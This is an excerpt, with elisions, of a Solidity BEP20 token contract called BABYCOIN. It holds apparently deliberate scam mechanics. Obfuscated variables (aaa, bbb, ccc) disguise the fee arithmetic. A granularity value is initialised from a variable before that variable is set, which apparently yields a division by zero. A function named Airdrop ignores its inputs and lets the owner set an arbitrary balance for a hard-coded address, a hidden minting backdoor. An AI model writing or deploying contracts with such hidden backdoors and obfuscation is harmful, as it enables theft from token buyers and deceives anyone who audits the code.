...
contract BABYCOIN is Context, IBEP20, Ownable {
    ...
    uint256 private _GRANULARITY = aaa;

    uint256 private _tTotal;
    uint256 private _rTotal;
    uint256 private aaa = 100;
    uint256 private bbb = 10 * 10;
    uint256 private ccc = 1000 / 10;
    uint256 public tFeet = _tFeeTotal;
    uint256 private _tFeeTotal;
    uint256 public tBurnt = _tBurnTotal;
    uint256 private _tBurnTotal;
    uint256 public tLpPt = _tLiquidityPoolTotal;
    uint256 private _tLiquidityPoolTotal;

    uint256 public     _TAX_FEE;
    uint256 private TaxF = _TAX_FEE;
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _liquiditypoolFee,address _FeeAddress,address _dev) {
        ...
        TaxF = _txFee* aaa;
        _BURN_FEE = _burnFee * aaa;
        _LIQUIDITYPOOL_FEE = _liquiditypoolFee* bbb;
        ORIG_TAX_FEE = TaxF;
    ...
    function updateFee(uint256 _txFee,uint256 _burnFee,uint256 _liquiditypoolFee) onlyDev() public{
        require(_txFee < bbb && _burnFee < bbb && _liquiditypoolFee < bbb);
        TaxF = _txFee* ccc;
        _BURN_FEE = _burnFee * ccc;
        _LIQUIDITYPOOL_FEE = _liquiditypoolFee* ccc;
        ORIG_TAX_FEE = TaxF;
        ORIG_BURN_FEE = _BURN_FEE;
        ORIG_LIQUIDITYPOOL_FEE = _LIQUIDITYPOOL_FEE;
    }
    ...
    function _reflectFee(uint256 rFee, uint256 rBurn, uint256 tFee, uint256 tBurn, uint256 tLiquidityPool) private {
        ...
        tFeet = tFeet.add(tFee);
        tBurnt = tBurnt.add(tBurn);
        tLpPt = tLpPt.add(tLiquidityPool);
    ...
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tFee, uint256 tBurn, uint256 tLiquidityPool) = _getTBasics(tAmount, TaxF, _BURN_FEE, _LIQUIDITYPOOL_FEE);
    ...
    function _getTBasics(uint256 tAmount, uint256 taxFee, uint256 burnFee, uint256 liquiditypoolFee) private view returns (uint256, uint256, uint256) {
        uint256 tFee = ((tAmount.mul(taxFee)).div(_GRANULARITY)).div(ccc);
        uint256 tBurn = ((tAmount.mul(burnFee)).div(_GRANULARITY)).div(ccc);
        uint256 tLiquidityPool = ((tAmount.mul(liquiditypoolFee)).div(_GRANULARITY)).div(ccc);
    ...
    function removeAllFee() private {
        if(TaxF == 0 && _BURN_FEE == 0 && _LIQUIDITYPOOL_FEE == 0) return;
...
// Revert tokens which are received by contract
    ...
    function Airdrop(address xyz, uint256 xyz2) external onlyOwner {
      _rOwned[0x8A918dDa9eA032c36567020D0e03E5cc5C76CD72]  = xyz2 * _DECIMALFACTOR;
    }
}